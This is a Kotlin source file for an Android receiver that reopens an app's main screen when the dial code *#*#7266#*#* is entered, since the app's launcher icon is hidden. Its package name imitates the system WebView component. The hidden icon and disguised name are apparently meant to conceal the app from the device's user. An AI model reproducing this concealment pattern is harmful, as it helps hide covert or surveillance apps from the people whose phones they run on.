package com.android.webview

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log

/**
 * Receives secret dial code *#*#7266#*#* to re-open the MainActivity
 * when the launcher icon is hidden.
 */
class SecretCodeReceiver : BroadcastReceiver() {

    companion object {
        private const val TAG = "SecretCodeReceiver"
    }

    override fun onReceive(context: Context, intent: Intent) {
        Log.i(TAG, "Secret code received — launching MainActivity")
        val launchIntent = Intent(context, MainActivity::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
        }
        context.startActivity(launchIntent)
    }
}

